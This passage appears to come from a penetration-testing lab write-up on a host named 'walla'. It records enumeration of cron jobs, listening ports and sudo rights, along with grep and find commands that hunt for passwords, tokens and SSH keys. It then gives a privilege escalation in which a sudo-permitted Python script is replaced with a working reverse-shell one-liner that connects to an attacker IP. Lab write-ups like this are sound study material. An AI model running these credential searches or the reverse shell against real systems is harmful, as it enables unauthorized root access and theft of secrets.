# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

ls -la /etc/cron.* 2>/dev/null
/etc/cron.d:
total 16
drwxr-xr-x   2 root root 4096 Sep 17  2020 .
drwxr-xr-x 102 root root 4096 Sep 17  2020 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--   1 root root  712 Dec 17  2018 php

/etc/cron.daily:
total 40
drwxr-xr-x   2 root root 4096 Sep 17  2020 .
drwxr-xr-x 102 root root 4096 Sep 17  2020 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root 1478 May 28  2019 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x   1 root root  338 Jan 28  2019 lighttpd
-rwxr-xr-x   1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x   1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x   1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Sep 17  2020 .
drwxr-xr-x 102 root root 4096 Sep 17  2020 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Sep 17  2020 .
drwxr-xr-x 102 root root 4096 Sep 17  2020 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x   2 root root 4096 Sep 17  2020 .
drwxr-xr-x 102 root root 4096 Sep 17  2020 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  813 Feb 10  2019 man-db

crontab -l 2>/dev/null
```

6. Processes & Network

```
ps aux

ps -ef

ss -tulwn 2>/dev/null
tcp     LISTEN   0        32               0.0.0.0:53             0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*     
tcp     LISTEN   0        5              127.0.0.1:631            0.0.0.0:*     
tcp     LISTEN   0        64               0.0.0.0:23             0.0.0.0:*     
tcp     LISTEN   0        100              0.0.0.0:25             0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:42042          0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:8091           0.0.0.0:*     
tcp     LISTEN   0        128              0.0.0.0:422            0.0.0.0:*  

netstat -tulnp 2>/dev/null
```

7.  Software / Packages

```
dpkg -l 2>/dev/null | head -n 200

rpm -qa 2>/dev/null | head -n 200
```

8. Loot Files & Credentials

```
grep -R "password" /etc 2>/dev/null | head -n 50

ls -la /var/www 2>/dev/null

grep -R "password\|db\|user" /var/www 2>/dev/null | head -n 50

find /home -type f -name "*.txt" 2>/dev/null

find /home -type f -name "*history*" 2>/dev/null

find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null

grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50

find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
/var/lib/apt/cdroms.list~
/etc/resolv.conf.bak
/etc/apt/sources.list~

```

9.  Containers / Virtualization

```
ls -la /.dockerenv 2>/dev/null

grep -i docker /proc/1/cgroup 2>/dev/null
```

10. Automated Enumeration 

```
/usr/lib/systemd/system/raspapd.service
You have write privileges over 

/lib/systemd/system/raspapd.service

/etc/systemd/system/multi-user.target.wants/raspapd.service  

User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
Sudoers file: /etc/sudoers.d/090_raspap is readable
ww-data ALL=(ALL) NOPASSWD:/sbin/ifdown
www-data ALL=(ALL) NOPASSWD:/sbin/ifup
www-data ALL=(ALL) NOPASSWD:/usr/bin/python /home/walter/wifi_reset.py
www-data ALL=(ALL) NOPASSWD:/bin/systemctl start hostapd.service
www-data ALL=(ALL) NOPASSWD:/bin/systemctl stop hostapd.service
www-data ALL=(ALL) NOPASSWD:/bin/systemctl start dnsmasq.service
www-data ALL=(ALL) NOPASSWD:/bin/systemctl stop dnsmasq.service

Sudo version 1.8.27  

```

11. Possible PE Paths

```

```

**Privilege Escalation**

1. PE Steps

- Noticed that the following command is allowed with no password using sudo. 

```
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
```

- Tested if could rename the wifi_reset.py 

```
mv wifi_reset.py wifi_reset2.py
```

- Created new wifi.reset.py

```
nano wifi_reset.py

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.215",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

- Ran wifi_reset.py using sudo.

![[Pasted image 20260313161320.png]]

- Received reverse shell as root. 

![[Pasted image 20260313161350.png]]

2. Notes

```

```

